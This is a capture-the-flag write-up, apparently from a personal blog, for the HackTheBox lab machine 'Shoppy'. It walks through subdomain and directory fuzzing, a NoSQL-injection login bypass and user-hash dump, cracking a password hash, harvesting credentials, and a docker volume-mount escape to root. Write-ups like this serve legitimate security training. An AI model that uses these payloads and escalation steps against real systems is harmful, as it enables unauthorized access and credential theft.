---
layout: post
title: HackTheBox - Shoppy
date: 2022-09-25 18:25 +0200
author: Arcee
tags: htb box easy windows
categories: [HackTheBox, Box]
---

![Shoppy](/assets/img/posts/htb-shoppy/Shoppy.png)

Easy Linux box with fuzzing/gobuster and hash cracking to privesc in a docker container escape. 

## Box Info:

Name: Shoppy

Release date: 17-09-2022

OS: Linux

Solve date: 25-9-2022

## Enumeration

Nmap results: 

```bash
$ nmap -sC -sV -p- 10.10.11.180    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 17:44 CEST
Nmap scan report for 10.10.11.180
Host is up (0.019s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp   open  http     nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
|_http-server-header: nginx/1.23.1
9093/tcp open  copycat?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Sun, 25 Sep 2022 15:44:28 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 11
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 11
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 6.409e-05
|     go_gc_duration_seconds{quantile="0.25"} 8.9257e-05

Nmap done: 1 IP address (1 host up) scanned in 107.15 seconds
```

We see a shoppy.htb, which we add to etc hosts (10.10.11.180 shoppy.htb). If we visit this webpage we see a countdown for a beta:

![Shoppy](/assets/img/posts/htb-shoppy/shoppypage.png)

We now have a domain, so we check for any subdomains using gobuster

```bash
$ gobuster vhost -w bitquark-subdomains-top100000.txt -t 50 -u shoppy.htb 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://shoppy.htb
[+] Method:       GET
[+] Threads:      50
[+] Wordlist:     bitquark-subdomains-top100000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/09/25 17:57:05 Starting gobuster in VHOST enumeration mode
===============================================================
Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]
                                                       
===============================================================
2022/09/25 17:57:57 Finished
===============================================================
```

We find a subdomain! Next, we try to enumerate directories and files

```bash
$ wfuzz -c -z file,raft-large-directories.txt --hc 404 "http://shoppy.htb/FUZZ/" 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shoppy.htb/FUZZ/
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000000003:   302        0 L      4 W        28 Ch       "admin"                                            
000000039:   200        25 L     62 W       1074 Ch     "login"                                            
000000109:   302        0 L      4 W        28 Ch       "Admin"                                            
000000160:   200        25 L     62 W       1074 Ch     "Login"                                            
000000681:   302        0 L      4 W        28 Ch       "ADMIN"
```

It seems that /admin gives a redirect to /login. 

![Shoppy](/assets/img/posts/htb-shoppy/login.png)

We get a login page, so we try to bypass. Which can be done with the following username: `admin'||''==='`

![Shoppy](/assets/img/posts/htb-shoppy/afterlogin.png)

We use the same payload in the search field to retrieve a list of users:

```json
[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
```

We use [crackstation.net](http://crackstation.net) to see if we can crack one of the hashes. The admin hash gives no result, but the josh hash does give a result: `remembermethisway`

![Shoppy](/assets/img/posts/htb-shoppy/mattermostlogin.png)

Which logs us in!

![Shoppy](/assets/img/posts/htb-shoppy/mattermost.png)

In the ‘Deploy Machine’ tab we can find credentials for the machine: 

![Shoppy](/assets/img/posts/htb-shoppy/credentials.png)

So we try these credentials for ssh.

```bash
┌──(arcee㉿soundwave)-[~/Documents/Support]
└─$ ssh jaeger@10.10.11.180 
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Sep 25 11:10:51 2022 from 10.10.14.9
jaeger@shoppy:~$ cat user.txt
d5****************************0c
```

When looking at the permissions we see that the jaeger user is allowed to run /home/deploy/password-manager:

```bash
jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

When we look at the code of the password-manager:

```bash
$ cat /home/deploy/password-manager
...
Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported
...
```

So we see the master password here: Sample. We execute the password manager and use the password. 

```bash
sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

We can now log in on ssh using deploy@10.10.11.180 and the given password. Which leads us to a docker container where we can use the standard docker container escape payload we can find in GTFOBins ([https://gtfobins.github.io/gtfobins/docker/](https://gtfobins.github.io/gtfobins/docker/)): 

```bash
$ ssh deploy@10.10.11.180
deploy@10.10.11.180's password: 
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Sep 25 11:17:33 2022 from 127.0.0.1
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# hostname -I
172.17.0.3 
# cat /root/root.txt
17****************************e7
```
